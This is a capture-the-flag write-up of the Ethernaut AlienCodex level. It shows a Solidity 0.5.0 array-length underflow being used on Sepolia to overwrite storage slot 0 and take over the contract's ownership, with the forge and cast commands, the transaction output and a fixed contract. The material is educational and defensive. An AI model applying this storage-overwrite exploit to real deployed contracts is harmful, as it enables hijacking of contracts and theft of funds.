> **⚠️ EDUCATIONAL PURPOSE ONLY**
> This document is part of the [Ethernaut CTF](https://ethernaut.openzeppelin.com/) educational security challenges.
> The techniques described here are for **authorized security testing and learning purposes only**.
> **DO NOT** use these methods on contracts you don't own or without explicit authorization.

---

# Level 19 - AlienCodex: Exploitation Report

## Challenge Information

| Property | Value |
|----------|-------|
| **Level** | 19 - AlienCodex |
| **Difficulty** | Medium |
| **Objective** | Claim ownership of the AlienCodex contract |
| **Instance Address** | `0x013D74D197324c611d070b213D1fAbff165E7B43` |
| **Level Address** | `0x0BC04aa6aaC163A6B3667636D798FA053D43BD11` |
| **Attacker Contract** | `0x5a17278Dac231B9Bc41FB86eE2AE0d3fAECfF477` |
| **Status** | ✅ COMPLETED |

---

## Vulnerability Summary

| Aspect | Details |
|--------|---------|
| **Type** | Array Underflow + Storage Layout Collision |
| **Severity** | 🔴 Critical |
| **Attack Vector** | External |
| **Impact** | Complete ownership hijacking via arbitrary storage write |
| **Root Cause** | Unchecked array length decrement in Solidity 0.5.0 |
| **CWE** | CWE-191: Integer Underflow |

---

## Root Cause Analysis

### The Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;        // Slot 0 (packed with owner from Ownable)
    bytes32[] public codex;     // Slot 1 stores array length

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;         // ⚠️ VULNERABLE: No underflow check!
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;    // ⚠️ No bounds check after underflow!
    }
}
```

### Storage Layout Analysis

#### Before Underflow

```
Slot 0: [owner address (20 bytes)] [contact bool (1 byte)] [padding (11 bytes)]
Slot 1: codex.length = 0
Slot keccak256(1): codex[0] (if it existed)
Slot keccak256(1) + 1: codex[1] (if it existed)
...
```

#### After Underflow (calling retract() when length=0)

```
Slot 0: [owner address] [contact bool] [padding]
Slot 1: codex.length = 2^256 - 1 (underflow!)
Slot keccak256(1): codex[0]
Slot keccak256(1) + 1: codex[1]
...
Slot 2^256 - 1: codex[2^256 - 1 - keccak256(1)]
Slot 0: codex[2^256 - keccak256(1)] ← WRAPS AROUND!
```

### Why This Works

**Key Insights:**

1. **Solidity 0.5.0 Lacks Overflow/Underflow Protection**
   - Pre-0.8.0 versions don't automatically revert on arithmetic errors
   - `codex.length--` when length is 0 wraps to `2^256 - 1`

2. **Dynamic Array Storage Mapping**
   - Array length stored at slot `p`
   - Array elements stored starting at `keccak256(p)`
   - For `codex` at slot 1: elements start at `keccak256(1)`

3. **Storage Wrapping**
   - Storage space is `2^256` slots
   - Access to `codex[i]` maps to slot: `keccak256(1) + i (mod 2^256)`
   - With length = `2^256 - 1`, we can access ANY storage slot!

4. **Calculating Slot 0 Index**
   ```
   target_slot = 0
   array_start = keccak256(1)

   We need: (array_start + index) mod 2^256 = 0
   Therefore: index = 2^256 - array_start

   In code: index = type(uint256).max - keccak256(1) + 1
   ```

---

## Exploitation Sequence

### Mermaid Attack Flow

```mermaid
sequenceDiagram
    participant Attacker
    participant AliencodexAttacker
    participant AlienCodex

    Note over Attacker: Deploy AliencodexAttacker contract
    Attacker->>AliencodexAttacker: deploy(targetAddress)

    Note over Attacker: Execute attack
    Attacker->>AliencodexAttacker: attack()

    Note over AliencodexAttacker: Step 1: Enable contact modifier
    AliencodexAttacker->>AlienCodex: makeContact()
    AlienCodex-->>AlienCodex: contact = true
    AlienCodex-->>AliencodexAttacker: Success

    Note over AliencodexAttacker: Step 2: Underflow array
    AliencodexAttacker->>AlienCodex: retract()
    Note over AlienCodex: codex.length: 0 → 2^256-1
    AlienCodex-->>AliencodexAttacker: Success

    Note over AliencodexAttacker: Step 3: Calculate target index
    AliencodexAttacker->>AliencodexAttacker: arrayStart = keccak256(1)
    AliencodexAttacker->>AliencodexAttacker: targetIndex = 2^256 - arrayStart

    Note over AliencodexAttacker: Step 4: Overwrite owner
    AliencodexAttacker->>AlienCodex: revise(targetIndex, attackerAddress)
    Note over AlienCodex: slot[0] = attacker address
    AlienCodex-->>AliencodexAttacker: Success

    AliencodexAttacker-->>Attacker: Ownership transferred ✅
```



---

## Exploitation Steps

### Step 1: Deploy Attacker Contract

**Command:**
```bash
forge script script/levels/19_Aliencodex/AliencodexAttacker.s.sol:DeployAliencodexAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --private-key $PRIVATE_KEY \
  --broadcast
```

**Output:**
```
========================================
Deploying AliencodexAttacker...
========================================
Target AlienCodex address: 0x013D74D197324c611d070b213D1fAbff165E7B43

========================================
Deployment successful!
========================================
AliencodexAttacker deployed at: 0x5a17278Dac231B9Bc41FB86eE2AE0d3fAECfF477
```

### Step 2: Execute Attack

**Command:**
```bash
cast send 0x5a17278Dac231B9Bc41FB86eE2AE0d3fAECfF477 "attack()" \
  --rpc-url $SEPOLIA_RPC_URL \
  --private-key $PRIVATE_KEY \
  --gas-limit 3000000
```

**Output:**
```
blockHash            0xa5414d97659702f1b26e99db3e181911562789f082a5d45582d14704a4ead50f
blockNumber          9809335
status               1 (success)
transactionHash      0x32e51b029e1a2870e9530c3c80ac6e1e88bc4264d607f4915c21059fe58809b0
gasUsed              58972
from                 0xf350B91b403ced3c6E68d34C13eBdaaE3bbd4E01
to                   0x5a17278Dac231B9Bc41FB86eE2AE0d3fAECfF477
```

**What Happened:**
1. Called `makeContact()` → set `contact = true`
2. Called `retract()` → underflowed `codex.length` from 0 to `2^256 - 1`
3. Calculated index: `2^256 - keccak256(1)`
4. Called `revise(index, attackerAddress)` → overwrote slot 0 with attacker address

### Step 3: Verify Ownership

**Command:**
```bash
cast call 0x013D74D197324c611d070b213D1fAbff165E7B43 "owner()" \
  --rpc-url $SEPOLIA_RPC_URL
```

**Output:**
```
0x000000000000000000000000f350b91b403ced3c6e68d34c13ebdaae3bbd4e01
```

✅ **Ownership successfully transferred to attacker address!**

---

## Proof of Exploit

### Before Attack

```bash
$ cast call 0x013D74D197324c611d070b213D1fAbff165E7B43 "owner()" --rpc-url $SEPOLIA_RPC_URL
0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11
```

**Original Owner:** `0x0bc04aa6aac163a6b3667636d798fa053d43bd11` (Level Factory)

### After Attack

```bash
$ cast call 0x013D74D197324c611d070b213D1fAbff165E7B43 "owner()" --rpc-url $SEPOLIA_RPC_URL
0x000000000000000000000000f350b91b403ced3c6e68d34c13ebdaae3bbd4e01
```

**New Owner:** `0xf350b91b403ced3c6e68d34c13ebdaae3bbd4e01` (Attacker Address) ✅

### Transaction Evidence

- **Attacker Contract Deployment:** `0x5a17278Dac231B9Bc41FB86eE2AE0d3fAECfF477`
- **Attack Transaction:** `0x32e51b029e1a2870e9530c3c80ac6e1e88bc4264d607f4915c21059fe58809b0`
- **Block Number:** `9809335`
- **Gas Used:** `58,972`
- **View on Etherscan:** [Target Contract](https://sepolia.etherscan.io/address/0x013D74D197324c611d070b213D1fAbff165E7B43) | [Attack TX](https://sepolia.etherscan.io/tx/0x32e51b029e1a2870e9530c3c80ac6e1e88bc4264d607f4915c21059fe58809b0)

---

## Remediation

### ✅ Recommended Fix: Upgrade to Solidity 0.8.0+

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;  // Automatic overflow/underflow checks

import "@openzeppelin/contracts/access/Ownable.sol";

contract AlienCodexFixed is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        require(contact, "Must make contact first");
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        require(codex.length > 0, "Array is empty");
        codex.pop();  // ✅ Safe array reduction
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        require(i < codex.length, "Index out of bounds");  // ✅ Bounds check
        codex[i] = _content;
    }
}
```

### Why This Works

**Protection Mechanisms:**

1. **Automatic Underflow Protection (0.8.0+)**
   - `codex.length--` will revert if length is 0
   - No need for explicit SafeMath

2. **Explicit Bounds Checking**
   - `require(codex.length > 0)` prevents empty array operations
   - `require(i < codex.length)` validates array access

3. **Use `pop()` Instead of `length--`**
   - More explicit and safer API
   - Better code readability

4. **Updated Access Control**
   - `require` instead of `assert` for modifiers
   - More gas efficient and clearer error messages

---

## Key Takeaways

### Security Lessons

1. **Never Trust Pre-0.8.0 Arithmetic**
   - Always use OpenZeppelin's SafeMath for Solidity < 0.8.0
   - Or upgrade to 0.8.0+ for automatic protection

2. **Storage Layout is Predictable**
   - Dynamic arrays: data starts at `keccak256(slot)`
   - Anyone can calculate storage locations
   - Length manipulation can expose entire storage

3. **Array Bounds Are Not Automatically Enforced**
   - `array[index] = value` doesn't check bounds in old Solidity
   - Length manipulation + unchecked access = arbitrary storage write

4. **Inheritance Affects Storage Layout**
   - `Ownable` places `owner` at slot 0
   - Child contract variables follow sequentially
   - Packed storage can be exploited together

### Real-World Implications

- **High Severity:** Any contract with array manipulation in Solidity < 0.8.0
- **Affected Protocols:** Legacy DeFi protocols, governance contracts, registries
- **Similar Vulnerabilities:** [Compound Governance Vulnerability](https://medium.com/coinmonks/storage-layout-manipulation-in-solidity-9e23b7d9ce0d)

---

**Report Generated:** 2025-12-10
**Challenge Status:** ✅ Completed Successfully
**Attacker Contract:** [AliencodexAttacker.sol](./AliencodexAttacker.sol)
